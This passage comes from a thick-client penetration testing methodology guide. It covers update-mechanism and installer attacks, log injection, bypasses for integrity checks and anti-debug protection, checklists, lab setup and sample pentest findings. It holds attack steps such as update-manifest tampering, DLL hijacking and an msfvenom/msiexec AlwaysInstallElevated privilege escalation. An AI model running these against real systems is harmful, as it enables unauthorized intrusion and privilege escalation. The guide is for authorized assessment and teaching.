1. Identify update URL:
   - From strings analysis in binary
   - From Procmon network activity during "Check for Updates"
   - Example: http://updates.vendor.com/latest.xml

2. Proxy the update request through Burp:
   - Configure Proxifier to route app traffic through Burp
   - Trigger "Check for Updates"
   - Capture update manifest request in Burp

3. Test update manifest tampering:
   - Does the update URL use HTTP? (critical vulnerability)
   - Does the app verify the signature on the update package?
   - Modify the update manifest to point to malicious binary

4. Test for signature bypass:
   - Download legitimate update package
   - Replace payload with malicious code
   - Can you strip or bypass signature verification?

5. Check for unsigned updates:
   sigcheck.exe -u -e C:\Users\<user>\AppData\Local\Temp\update.exe
   # -u = not signed
   # -e = exclude embedded signature

Impact: Full RCE on all machines running the application
```

**Test Case TC-UPDATE-002: Installer Privilege Escalation**

```
Windows installers often run as SYSTEM and may be abused.

1. Run installer as unprivileged user
2. During installation (before completion), check for:
   - Temp files created in world-writable locations
   - Privileged processes that launch external binaries
   - Service binaries extracted to user-writable paths

3. DLL hijacking via installer:
   procmon → filter installer PID → look for NAME NOT FOUND DLLs
   Copy malicious DLL to that path during installation window

4. Check for AlwaysInstallElevated:
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   
   If both are 1:
   msfvenom -p windows/x64/exec CMD=calc.exe -f msi -o malicious.msi
   msiexec /quiet /qn /i malicious.msi
```

---

## 24. Phase 17 — Logging, Monitoring & Error Handling

### 24.1 Error Handling & Information Disclosure

**Test Case TC-LOG-001: Error Message Information Disclosure**

```
1. Trigger error conditions:
   - Invalid input values (letters in numeric fields, max-length overflow)
   - Network disconnection during operations
   - Invalid file paths
   - SQL errors (inject malformed SQL)

2. Analyze error messages for:
   - Stack traces (reveals code structure, class names)
   - Database connection strings in error output
   - SQL query text in error messages
   - Internal IP addresses or hostnames
   - Software version information
   - File system paths

3. Test for verbose error modes:
   - Is there a debug flag in config? (debug=true)
   - What happens with --debug or /debug command line flags?

4. Check log files:
   - Application logs in %APPDATA%\<App>\logs\
   - Windows Event Log: eventvwr.msc → Applications
   - Check for cleartext credentials in logs
   - Are logs accessible to unprivileged users? (icacls <logfile>)
```

**Test Case TC-LOG-002: Audit Trail Testing**

```
1. Perform sensitive actions (login, data access, modification, deletion)
2. Check if actions are logged:
   - Are logs written to a file?
   - Are logs sent to a central server?
   - Are logs tamper-evident (signed or append-only)?

3. Test log bypass:
   - Can you delete your own log entries?
   - Can you overwrite log files (if log directory is writable)?

4. Test for log injection:
   - Input newline characters (\n, %0a) into logged fields
   - Inject fake log entries:
   admin logged in successfully\n[CRITICAL] Password changed for admin

5. For structured logging (JSON, XML):
   - Inject format-breaking characters: ", \\, <, >
   - Test for log injection that could fool SIEM parsers
```

---

## 25. Phase 18 — Anti-Tampering & Anti-Debugging Controls

### 25.1 Anti-Tamper Testing

**Test Case TC-PROTECT-001: Code Integrity Verification Bypass**

```
Some applications check their own integrity (hash/signature verification).

1. Identify integrity checks in decompiled code:
   Search for: MD5, SHA256, GetFileHash, VerifySignature

2. Common implementation:
   var hash = ComputeHash(Assembly.GetExecutingAssembly().Location);
   if (hash != expectedHash) { Environment.Exit(1); }

3. Bypass methods:
   a. Patch the comparison to always pass
   b. Recalculate and hardcode the new hash after patching
   c. Hook the hash computation function to return expected value

4. Authenticode signature verification bypass:
   Some apps call WinVerifyTrust to verify own signature
   Patch the return value check (return S_OK = 0)
```

### 25.2 ScyllaHide for Anti-Debug Bypass

```
ScyllaHide is the recommended plugin for bypassing anti-debug in x64dbg:

1. Download: https://github.com/x64dbg/ScyllaHide
2. Place in x64dbg plugins directory
3. x64dbg → Plugins → ScyllaHide → Options
4. Enable:
   ✓ PEB Patches (fixes BeingDebugged, NtGlobalFlag, Heap Flags)
   ✓ NtSetInformationThread
   ✓ NtQueryInformationProcess
   ✓ BlockInput
   ✓ NtUserFindWindowEx
   ✓ NtSetDebugFilterState
   ✓ OutputDebugString
   ✓ Hooks (patches anti-debug APIs in-process)

5. Apply profile and debug application — most anti-debug techniques now bypassed
```

---

## 26. OWASP Desktop App Top 10 — Complete Mapping

The OWASP Desktop Application Security Top 10 is a desktop-focused Top 10 covering injections, auth/session, crypto, insecure communications, and more — helping anchor thick client testing in a risk-based model.

| # | Vulnerability | Description | Test Cases |
|---|---|---|---|
| **DA1** | Injections | SQL, CMD, LDAP, XML injection via any input or protocol | TC-INJECT-001 to 005 |
| **DA2** | Broken Auth & Session Mgmt | Weak tokens, session fixation, no lockout | TC-AUTH-001, TC-AUTH-002 |
| **DA3** | Sensitive Data Exposure | Cleartext storage, weak encryption, secrets in config | TC-STORAGE-001 to 005, TC-CRYPTO-001 |
| **DA4** | Improper Cryptography | Weak algorithms, hardcoded keys, improper IV | TC-CRYPTO-001, TC-CRYPTO-002 |
| **DA5** | Improper Authorization | Horizontal/vertical privilege escalation, IDOR | TC-AUTHZ-001 to 003 |
| **DA6** | Security Misconfiguration | Debug mode, verbose errors, insecure defaults | TC-LOG-001, TC-LOG-002 |
| **DA7** | Insecure Communication | Cleartext protocols, weak TLS, no cert validation | TC-NETWORK-001 to 006 |
| **DA8** | Poor Code Quality | Memory corruption, buffer overflows, null dereferences | TC-BINARY-001, TC-BINARY-002 |
| **DA9** | Using Vulnerable Components | Outdated DLLs, vulnerable third-party libraries | TC-STATIC-005, TC-STATIC-007 |
| **DA10** | Insufficient Logging & Monitoring | No audit trail, cleartext logs, log injection | TC-LOG-001, TC-LOG-002 |

---

## 27. OWASP TASVS Control Groups

The OWASP TASVS (Thick Client Application Security Verification Standard) fills the gap between the OWASP ASVS for web applications and MASVS for mobile apps. The first public version was released in September 2024.

The TASVS defines the following control groups:

| Control Group | Identifier | Focus Area |
|---|---|---|
| **Architecture, Design & Threat Modeling** | TASVS-ARCH | Secure design principles, threat model completeness |
| **Authentication** | TASVS-AUTH | Login mechanisms, MFA, credential storage |
| **Authorization** | TASVS-AUTHZ | Access controls, privilege separation |
| **Code Quality** | TASVS-CODE | Binary protections, DLL loading, signed code |
| **Communication** | TASVS-COMM | TLS versions, certificate validation, encryption |
| **Cryptography** | TASVS-CRYPTO | Algorithm strength, key management, random generation |
| **Resilience** | TASVS-RESILIENCE | Anti-tampering, anti-debug, obfuscation |
| **Storage** | TASVS-STORAGE | Data at rest, registry, temp files, sensitive data handling |

Download the full TASVS checklist (Excel):  
**https://github.com/OWASP/www-project-thick-client-application-security-verification-standard/releases**

---

## 28. Complete Test Case Checklist

### Master Checklist (GitHub-Friendly Format)

```markdown
## INFORMATION GATHERING
- [ ] TC-RECON-001: Application metadata and CVE discovery
- [ ] TC-RECON-002: Installer static analysis
- [ ] TC-RECON-003: Registry activity capture (Regshot)
- [ ] TC-RECON-004: File system activity capture (Procmon)
- [ ] TC-RECON-005: Technology fingerprinting (DIE, CFF Explorer)
- [ ] TC-RECON-006: Network port discovery (TCPView, netstat)

## STATIC ANALYSIS
- [ ] TC-STATIC-001: .NET decompilation with dnSpy
- [ ] TC-STATIC-002: .NET deobfuscation with de4dot
- [ ] TC-STATIC-003: Java JAR decompilation with JD-GUI / JADX
- [ ] TC-STATIC-004: Native binary analysis with Ghidra
- [ ] TC-STATIC-005: String extraction and secret discovery
- [ ] TC-STATIC-006: Configuration file review
- [ ] TC-STATIC-007: Binary protection verification (checksec/winchecksec)

## DYNAMIC ANALYSIS
- [ ] TC-DYNAMIC-001: Process monitoring during application lifecycle
- [ ] TC-DYNAMIC-002: API monitoring (API Monitor)
- [ ] TC-DYNAMIC-003: Debug-based license/auth bypass (dnSpy)
- [ ] TC-DYNAMIC-004: Frida-based runtime hooking
- [ ] TC-DYNAMIC-005: Anti-debug bypass (ScyllaHide)

## NETWORK ANALYSIS
- [ ] TC-NETWORK-001: HTTP/S traffic interception (Burp Suite)
- [ ] TC-NETWORK-002: SSL pinning bypass
- [ ] TC-NETWORK-003: Non-HTTP traffic capture (Echo Mirage)
- [ ] TC-NETWORK-004: MITM_Relay for Burp + custom protocols
- [ ] TC-NETWORK-005: Wireshark protocol analysis
- [ ] TC-NETWORK-006: Direct database connection interception
- [ ] TC-NETWORK-007: TLS version and cipher suite testing (testssl.sh)
- [ ] TC-NETWORK-008: Certificate validation testing

## LOCAL STORAGE
- [ ] TC-STORAGE-001: Configuration file secret discovery
- [ ] TC-STORAGE-002: Windows Registry secrets
- [ ] TC-STORAGE-003: SQLite/local database analysis
- [ ] TC-STORAGE-004: Windows Credential Manager testing
- [ ] TC-STORAGE-005: Temporary file secret discovery

## AUTHENTICATION & AUTHORIZATION
- [ ] TC-AUTH-001: Password policy and brute force testing
- [ ] TC-AUTH-002: Session token security analysis
- [ ] TC-AUTH-003: Multi-factor authentication bypass
- [ ] TC-AUTHZ-001: Horizontal privilege escalation (IDOR)
- [ ] TC-AUTHZ-002: Vertical privilege escalation
- [ ] TC-AUTHZ-003: Client-side authorization bypass

## INJECTION TESTING
- [ ] TC-INJECT-001: SQL injection via input fields
- [ ] TC-INJECT-002: SQL injection via Echo Mirage (protocol-level)
- [ ] TC-INJECT-003: OS command injection
- [ ] TC-INJECT-004: LDAP injection
- [ ] TC-INJECT-005: XML/XXE injection
- [ ] TC-INJECT-006: Buffer overflow testing (fuzz inputs)
- [ ] TC-INJECT-007: Format string vulnerabilities

## BINARY & REVERSE ENGINEERING
- [ ] TC-BINARY-001: Anti-debug detection and bypass
- [ ] TC-BINARY-002: Obfuscation analysis and removal
- [ ] TC-BINARY-003: Packer identification and unpacking
- [ ] TC-BINARY-004: Code signing verification

## MEMORY ANALYSIS
- [ ] TC-MEMORY-001: Memory dump and credential extraction
- [ ] TC-MEMORY-002: In-memory value manipulation (Cheat Engine)
- [ ] TC-MEMORY-003: Heap memory inspection for sensitive data

## IPC TESTING
- [ ] TC-IPC-001: Named pipe enumeration and exploitation
- [ ] TC-IPC-002: COM/DCOM object security testing
- [ ] TC-IPC-003: Shared memory abuse
- [ ] TC-IPC-004: Message queue testing

## DLL HIJACKING
- [ ] TC-DLL-001: DLL search order hijacking (Procmon + icacls)
- [ ] TC-DLL-002: DLL side-loading
- [ ] TC-DLL-003: EXE hijacking

## PRIVILEGE ESCALATION
- [ ] TC-PRIVESC-001: Insecure service permissions
- [ ] TC-PRIVESC-002: Scheduled task abuse
- [ ] TC-PRIVESC-003: AlwaysInstallElevated
- [ ] TC-PRIVESC-004: Unquoted service paths
- [ ] TC-PRIVESC-005: Writable service registry keys

## CRYPTOGRAPHY
- [ ] TC-CRYPTO-001: Weak encryption algorithm identification
- [ ] TC-CRYPTO-002: TLS/SSL configuration testing
- [ ] TC-CRYPTO-003: Hardcoded encryption key discovery
- [ ] TC-CRYPTO-004: Weak random number generation
- [ ] TC-CRYPTO-005: Password hashing algorithm review

## BUSINESS LOGIC
- [ ] TC-LOGIC-001: Workflow bypass
- [ ] TC-LOGIC-002: Privilege escalation via parameter tampering
- [ ] TC-LOGIC-003: Race condition testing
- [ ] TC-LOGIC-004: Boundary and negative value testing
- [ ] TC-LOGIC-005: Mass assignment vulnerability testing

## UI & WINDOW MANIPULATION
- [ ] TC-UI-001: Hidden/disabled control discovery (WinSpy++)
- [ ] TC-UI-002: Sensitive data in clipboard
- [ ] TC-UI-003: Screenshot protection bypass
- [ ] TC-UI-004: UI automation API abuse

## UPDATER & INSTALLER
- [ ] TC-UPDATE-001: Update mechanism MITM attack
- [ ] TC-UPDATE-002: Installer privilege escalation
- [ ] TC-UPDATE-003: Update signature verification bypass
- [ ] TC-UPDATE-004: Update server authentication

## LOGGING & ERROR HANDLING
- [ ] TC-LOG-001: Error message information disclosure
- [ ] TC-LOG-002: Audit trail integrity testing
- [ ] TC-LOG-003: Log injection via user input
- [ ] TC-LOG-004: Log file access control review

## ANTI-TAMPER
- [ ] TC-PROTECT-001: Code integrity verification bypass
- [ ] TC-PROTECT-002: Anti-debug control testing
- [ ] TC-PROTECT-003: Root/VM detection testing
```

---

## 29. Lab Setup Guide

### 29.1 Recommended Lab VM Configuration

```
┌────────────────────────────────────────────────────────────────────┐
│                        THICK CLIENT LAB SETUP                       │
│                                                                      │
│  HOST MACHINE (Physical or outer VM)                                 │
│  - Hypervisor: VMware Workstation Pro or VirtualBox                 │
│  - Network: Internal network only (no internet for test VMs)        │
│                                                                      │
│  VM 1: ATTACKER MACHINE                                              │
│  OS: Kali Linux 2025.x or Windows 11 (dual-tool)                   │
│  RAM: 4GB+                                                           │
│  Tools: Burp Suite Pro, Wireshark, Frida, mitmproxy, Metasploit    │
│  Network: Internal VMnet (e.g., 192.168.100.1)                     │
│                                                                      │
│  VM 2: TARGET MACHINE (Thick Client)                                 │
│  OS: Windows 10/11 x64 (match production environment)              │
│  RAM: 4GB+                                                           │
│  Tools: Sysinternals, dnSpy, x64dbg, Procmon, TCPView, API Monitor │
│  Applications: Target thick client application installed             │
│  Network: Internal VMnet (192.168.100.2)                            │
│  Snapshot: Take "CLEAN" snapshot before each test                   │
│                                                                      │
│  VM 3: BACKEND SERVER                                                │
│  OS: Windows Server 2019 or Linux                                   │
│  Services: Database, Application Server                              │
│  Network: Internal VMnet (192.168.100.3)                            │
└────────────────────────────────────────────────────────────────────┘
```

### 29.2 Tool Installation Script (Windows Target VM)

```powershell
# Save as: setup_thick_client_lab.ps1
# Run as Administrator

# 1. Install Chocolatey package manager
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

# 2. Install tools via Chocolatey
choco install -y wireshark
choco install -y burp-suite-free-edition
choco install -y fiddler
choco install -y sysinternals
choco install -y x64dbg
choco install -y ghidra
choco install -y sqlite-browser
choco install -y 7zip
choco install -y python3
choco install -y git
choco install -y frida  # pip install frida-tools

# 3. Install Python tools
pip install frida-tools
pip install mitm_relay
pip install mitmproxy

# 4. Download tools not in Chocolatey
# dnSpy (latest):
$dnspy = "https://github.com/dnSpyEx/dnSpy/releases/latest/download/dnSpy-net-win64.zip"
Invoke-WebRequest $dnspy -OutFile "$env:USERPROFILE\Desktop\dnSpy.zip"
Expand-Archive "$env:USERPROFILE\Desktop\dnSpy.zip" -DestinationPath "$env:USERPROFILE\Desktop\dnSpy"

# CFF Explorer:
$cff = "https://ntcore.com/files/CFF_Explorer.zip"
Invoke-WebRequest $cff -OutFile "$env:USERPROFILE\Desktop\CFF_Explorer.zip"

# Detect-It-Easy:
# https://github.com/horsicq/Detect-It-Easy/releases

# Regshot:
# https://github.com/Seabreg/Regshot/releases

# WinSpy++:
# https://github.com/strobejb/winspy/releases

# WinManipulate:
git clone https://github.com/appsecco/WinManipulate.git "$env:USERPROFILE\Desktop\WinManipulate"

Write-Host "[+] Lab setup complete!" -ForegroundColor Green
Write-Host "[!] Remember to take a VM snapshot now (CLEAN STATE)" -ForegroundColor Yellow
```

### 29.3 Practice Targets (Intentionally Vulnerable Applications)

Use these deliberately vulnerable applications for learning **legally**:

| App Name | Platform | What It Teaches | Source |
|---|---|---|---|
| **Damn Vulnerable Thick Client App (DVTA)** | .NET / Windows | SQL injection, cleartext creds, insecure storage, traffic interception | https://github.com/srini0x00/dvta |
| **Damn Vulnerable C# Application (DVCA)** | .NET | All major thick client vulnerabilities | Community-maintained |
| **OWASP WebGoat Desktop** | Java | OWASP vulnerabilities in desktop context | https://owasp.org/www-project-webgoat/ |
| **Metasploitable** | Linux | General exploitation practice | https://github.com/rapid7/metasploitable3 |
| **HackSys Extreme Vulnerable Driver** | Windows kernel | Kernel exploitation basics | https://github.com/hacksysteam/HackSysExtremeVulnerableDriver |

---

## 30. Sample Vulnerability Findings & CVSS Scoring

### Finding Template Examples

---

**FINDING: CRIT-001 — Hardcoded Database Credentials in Application Binary**

| Field | Value |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1 Score** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Affected Component** | AppName.exe — DatabaseHelper.cs class |
| **CWE** | CWE-798: Use of Hard-coded Credentials |
| **OWASP Desktop** | DA3: Sensitive Data Exposure |
| **TASVS** | TASVS-STORAGE-1.1 |

**Description:**  
During static analysis using dnSpy, hardcoded database credentials were discovered in the `DatabaseHelper` class. The connection string `Server=10.0.0.5;Database=AppDB;User Id=sa;Password=Admin123!;` is embedded directly in the compiled binary.

**Evidence:**  
```csharp
// Decompiled from AppName.exe → DatabaseHelper.cs
private static string connString = 
    "Server=10.0.0.5;Database=AppDB;User Id=sa;Password=Admin123!;";
```

**Impact:**  
Any user who can access the application binary (all installed users) can extract these credentials and gain direct SQL Server `sa` (system administrator) access to the backend database, allowing full read/write/delete access to all application data and potential OS command execution via `xp_cmdshell`.

**Remediation:**
1. Remove all hardcoded credentials from source code immediately
2. Store database credentials in a secrets management system (Azure Key Vault, HashiCorp Vault, AWS Secrets Manager)
3. Use least-privilege service accounts — not `sa` — for application database connections
4. Rotate the exposed `sa` credentials immediately
5. Audit all access using the exposed credentials in database audit logs

---

**FINDING: HIGH-001 — Insecure TLS 1.0 in Use**

| Field | Value |
|---|---|
| **Severity** | High |
| **CVSS v3.1 Score** | 7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| **Affected Component** | Network communication to api.vendor.com |
| **CWE** | CWE-326: Inadequate Encryption Strength |
| **OWASP Desktop** | DA7: Insecure Communication |

**Description:**  
Wireshark analysis confirmed the application negotiates TLS 1.0 for its primary API communication channel. TLS 1.0 is deprecated and vulnerable to POODLE, BEAST, and other downgrade attacks.

**Evidence:**  
```
Wireshark capture: ssl.record.version == 0x0301 (TLS 1.0)
Client Hello: TLS 1.0
Server Hello: TLS 1.0 accepted
Cipher: TLS_RSA_WITH_AES_128_CBC_SHA
```

**Remediation:**
1. Configure the application to require TLS 1.2 minimum (TLS 1.3 preferred)
2. Disable TLS 1.0 and 1.1 on both client and server
3. Implement certificate pinning to prevent downgrade attacks

---

**FINDING: MED-001 — Sensitive PII Stored in Cleartext SQLite Database**

| Field | Value |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1 Score** | 5.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |
| **Affected Component** | %APPDATA%\AppName\cache.db |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information |

**Description:**  
The application stores a local SQLite database at `%APPDATA%\AppName\cache.db` containing user PII (names, addresses, Social Security Numbers, account numbers) in cleartext, accessible to any user or process on the machine.

**Evidence:**  
```sql
-- Query results from DB Browser for SQLite:
SELECT * FROM customers LIMIT 3;
-- Returns: id=1, name="John Smith", ssn="123-45-6789", acct="4111111111111111"
-- Database file has no encryption (SQLite magic header visible)
```

**Remediation:**
1. Implement SQLCipher or AES encryption for the local SQLite database
2. Store the encryption key in Windows DPAPI (Data Protection API) — not hardcoded
3. Minimize PII stored locally — only cache non-sensitive data
4. Implement data retention policies to clear the cache after session end

---

## 31. Reporting Template Structure

A professional thick client pentest report should follow this structure:

```
1. EXECUTIVE SUMMARY (1-2 pages)
   - Overall risk posture
   - Critical findings summary
   - Business impact statement
   - Immediate action items

2. SCOPE & METHODOLOGY
   - Application name, version, and vendor
   - Testing dates and tester names
   - Test environment description
   - Methodology frameworks applied (OWASP TASVS, PTES, NIST SP 800-115)
   - Limitations and out-of-scope items

3. FINDINGS SUMMARY TABLE
   | ID       | Finding Title                         | Severity | Status |
   |----------|---------------------------------------|----------|--------|
   | CRIT-001 | Hardcoded DB Credentials              | Critical | Open   |
   | HIGH-001 | TLS 1.0 in Use                        | High     | Open   |
   | MED-001  | Cleartext PII in Local SQLite         | Medium   | Open   |
   | LOW-001  | Verbose Error Messages                | Low      | Open   |
   | INFO-001 | Missing Binary Hardening (ASLR/DEP)   | Info     | Open   |

4. DETAILED FINDINGS (per vulnerability)
   For each finding:
   - Finding ID and title
   - Severity rating with CVSS v3.1 score and vector
   - Affected component
   - CWE mapping
   - OWASP/TASVS mapping
   - Technical description
   - Step-by-step reproduction steps
   - Screenshots/evidence
   - Business impact
   - Remediation recommendation
   - References

5. APPENDIX
   A. Testing Tools Used
   B. Full Vulnerability References
   C. CVSS Score Calculations
   D. Scope Confirmation & Authorization Letter
```

---

## 32. Trusted References, GitHub Repos & Resources

### 32.1 Official Standards & Frameworks

| Resource | URL |
|---|---|
| **OWASP TASVS (Thick Client App Security Verification Standard)** | https://github.com/OWASP/www-project-thick-client-application-security-verification-standard |
| **OWASP Desktop App Security Top 10** | https://owasp.org/www-project-desktop-app-security-top-10/ |
| **OWASP ASVS v5.0 (2025)** | https://github.com/OWASP/ASVS |
| **NIST SP 800-115 Technical Guide to Info Security Testing** | https://csrc.nist.gov/publications/detail/sp/800-115/final |
| **PTES (Penetration Testing Execution Standard)** | http://www.pentest-standard.org/ |
| **MITRE ATT&CK for Enterprise** | https://attack.mitre.org/matrices/enterprise/ |
| **CWE (Common Weakness Enumeration)** | https://cwe.mitre.org/ |

### 32.2 Authoritative GitHub Repositories

| Repository | Description | URL |
|---|---|---|
| **m14r41/PentestingEverything** | Complete VAPT guide including thick client | https://github.com/m14r41/PentestingEverything |
| **RakeshKengale/RaKKeN** | Thick client tool index and methodology | https://github.com/RakeshKengale/RaKKeN |
| **buger-shack/scriptkiddie** | Thick client pentesting methodology notes | https://github.com/buger-shack/scriptkiddie |
| **dnSpy/dnSpyEx** | .NET decompiler and debugger | https://github.com/dnSpyEx/dnSpy |
| **x64dbg/x64dbg** | Windows debugger | https://github.com/x64dbg/x64dbg |
| **x64dbg/ScyllaHide** | Anti-anti-debug plugin for x64dbg | https://github.com/x64dbg/ScyllaHide |
| **frida/frida** | Dynamic instrumentation toolkit | https://github.com/frida/frida |
| **NationalSecurityAgency/ghidra** | NSA Ghidra reverse engineering | https://github.com/NationalSecurityAgency/ghidra |
| **danielmiessler/SecLists** | Wordlists for testing | https://github.com/danielmiessler/SecLists |
| **srini0x00/dvta** | Damn Vulnerable Thick Client App | https://github.com/srini0x00/dvta |
| **volatilityfoundation/volatility3** | Memory forensics framework | https://github.com/volatilityfoundation/volatility3 |
| **AFLplusplus/AFLplusplus** | Coverage-guided fuzzer | https://github.com/AFLplusplus/AFLplusplus |
| **drwetter/testssl.sh** | TLS/SSL testing script | https://github.com/drwetter/testssl.sh |
| **trailofbits/winchecksec** | Windows binary security check | https://github.com/trailofbits/winchecksec |
| **jrmdev/mitm_relay** | Non-HTTP protocol MITM | https://github.com/jrmdev/mitm_relay |
| **appsecco/WinManipulate** | Windows UI manipulation | https://github.com/appsecco/WinManipulate |
| **de4dot/de4dot** | .NET deobfuscator | https://github.com/de4dot/de4dot |
| **jtpereyda/boofuzz** | Network fuzzing framework | https://github.com/jtpereyda/boofuzz |
| **afine-com/DASVS** | Desktop Application Security Verification Standard | https://github.com/afine-com/DASVS |

### 32.3 Trusted Learning Resources

| Resource | Type | URL |
|---|---|---|
| **CyberArk Thick Client Penetration Testing Methodology** | Blog | https://www.cyberark.com/resources/threat-research-blog/thick-client-penetration-testing-methodology |
| **NetSPI Thick Client Testing Series** | Blog Series | https://www.netspi.com/blog/technical/network-penetration-testing/ |
| **SecureLayer7 Static Analysis & Reverse Engineering Series** | Blog | https://blog.securelayer7.net/static-analysismemory-forensics-reverse-engineering-thick-client-penetration-testing-part-4/ |
| **Hacking Articles - Thick Client Pentesting** | Blog | https://www.hackingarticles.in/thick-client-penetration-testing/ |
| **CSbyGB Pentips - Thick Client** | Reference | https://csbygb.gitbook.io/pentips/thick-client-pentest/thick-client |
| **hetmehta.com - Thick Client Checklist** | Checklist | https://hetmehta.com/resources/thick-client-checklist/ |
| **Qualysec - Thick Client Pen Testing Guide 2025** | Guide | https://qualysec.com/thick-client-pen-testing-a-comprehensive-guide/ |
| **afine.com - How to Perform Thick Client Penetration Testing** | Guide | https://afine.com/how-to-perform-thick-client-penetration-testing |
| **Sysinternals Suite (Microsoft)** | Tool Suite | https://learn.microsoft.com/en-us/sysinternals/ |
| **PortSwigger Web Security Academy** | Training | https://portswigger.net/web-security |

### 32.4 YouTube Learning Channels (Legitimate, Trusted)

| Channel | Relevant Content |
|---|---|
| **TCM Security (Heath Adams)** | Thick client and application security testing |
| **John Hammond** | Reverse engineering, CTF, binary analysis |
| **LiveOverflow** | Low-level exploitation, binary analysis |
| **ippsec** | HackTheBox walkthroughs including thick client apps |
| **MalwareAnalysisForHedgehogs** | Malware analysis and reverse engineering |
| **CyberSecurity by Gerald Auger** | Penetration testing methodology |
| **HackerSploit** | Kali Linux and pentesting tools |

---

## ⚠️ Legal & Ethical Reminder

This guide is intended **exclusively for legitimate, authorized security assessments**. The techniques described here are powerful and can cause significant harm if misused.

**Always:**
- ✅ Obtain **written authorization** before testing any application
- ✅ Test only in an **isolated, approved environment**
- ✅ Follow the **Rules of Engagement** strictly
- ✅ Report all findings **responsibly** to the application owner
- ✅ Handle all sensitive data discovered during testing with care

**Never:**
- ❌ Test applications you do not own or do not have explicit permission to test
- ❌ Use these techniques for unauthorized access, data theft, or sabotage
- ❌ Distribute vulnerabilities publicly without coordinated disclosure

**Relevant Laws:**
- Computer Fraud and Abuse Act (CFAA) — USA
- Computer Misuse Act 1990 — UK
- Information Technology Act 2000 (Section 66) — India
- Directive on Attacks Against Information Systems — EU
- Criminal Code Section 342.1 — Canada

---

*Document maintained for educational and authorized security assessment purposes only.*  
*Aligned with: OWASP TASVS v1.6 (2024), OWASP Desktop App Top 10, NIST SP 800-115, PTES, MITRE ATT&CK*  
*Last Updated: March 2026*
